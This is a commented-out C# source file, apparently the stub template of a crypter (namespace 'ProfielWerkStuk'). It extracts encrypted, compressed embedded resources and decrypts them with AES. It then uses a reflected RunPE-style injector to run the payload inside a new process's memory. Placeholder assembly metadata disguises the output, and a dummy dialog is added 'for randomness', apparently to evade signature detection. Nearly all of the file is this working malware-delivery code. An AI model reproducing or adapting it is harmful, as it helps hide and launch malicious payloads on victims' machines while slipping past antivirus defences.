/*using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

//assembly information
[assembly: AssemblyTitle("[title]")]
[assembly: AssemblyFileVersion("[fileversion]")]
[assembly: AssemblyVersion("[version]")]
[assembly: AssemblyDescription("[desc]")]
[assembly: AssemblyCompany("[company]")]
[assembly: AssemblyProduct("[product]")]
[assembly: AssemblyCopyright("[copyright]")]
[assembly: AssemblyTrademark("[trademark]")]

namespace ProfielWerkStuk
{
    class Program
    {        
        //extract resources from the file
        public static byte[] ExtractResource(String filename)
        {
            // We declare a new resource manager and we want it to manage the "Encrypted" resource.
            ResourceManager Manager = new ResourceManager("pwsres", Assembly.GetExecutingAssembly());
            // We retrieve the resource as an object and we cast it to a byte array since it's 
            // a byte array.
            byte[] bytes = (byte[])Manager.GetObject(filename);
            // We return the resource's byte array, aka the encrypted file bytes.
            return bytes;
        }

        [STAThread]
        static void Main(string[] args)
        {
            //added for randomness
            OpenFileDialog ofd = new OpenFileDialog();
            //try to inject/migrate the process 5 times on succes break the loop
            for (int i = 0; i < 5; i++)
            {
                if (Inject())
                    break;
            }
        }

        static bool Inject()
        {
            try
            {
                //get the embedded resources in byte arrays
                byte[] InjRes = ExtractResource("[injres]");
                byte[] PayloadRes = ExtractResource("[payloadres]");
                //wait 3 seconds
                Thread.Sleep(3000);
                //decompress the bytes
                InjRes = Decompress(InjRes);
                PayloadRes = Decompress(PayloadRes);
                //decrypt the bytes with the given key
                InjRes = _Decrypt(InjRes, "[enckey]");
                PayloadRes = _Decrypt(PayloadRes, "[enckey]");

                //create a new payload process and migrate the memorybytes using the RunPE and reflection
                MethodInfo mi = Assembly.Load(InjRes).GetType("Resource.reflect").GetMethod("Run");
                bool inj = (bool)mi.Invoke(null, new object[] { Assembly.GetExecutingAssembly().Location, "", PayloadRes, false });
                Console.WriteLine("Injected: {0}", inj);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }

        private static byte[] _Decrypt(byte[] bytes, string _key)
        {
            try
            {
                PasswordDeriveBytes pdb = new PasswordDeriveBytes(_key, Encoding.UTF8.GetBytes("4816382"));
                MemoryStream ms = new MemoryStream();
                Aes aes = new AesManaged();
                aes.Key = pdb.GetBytes(aes.KeySize / 8);
                aes.IV = pdb.GetBytes(aes.BlockSize / 8);
                CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write);
                cs.Write(bytes, 0, bytes.Length);
                cs.Close();
                return ms.ToArray();
            }
            catch
            {
                Environment.Exit(0);
                return new byte[] { };
            }
        }

        private static byte[] Decompress(byte[] b)
        {
            using (MemoryStream uncompressed = new MemoryStream())
            {
                using (MemoryStream compressed = new MemoryStream(b))
                {
                    using (DeflateStream ds = new DeflateStream(compressed, CompressionMode.Decompress))
                    {
                        ds.CopyTo(uncompressed);
                        return uncompressed.ToArray();
                    }
                }
            }
        }

    }
}
*/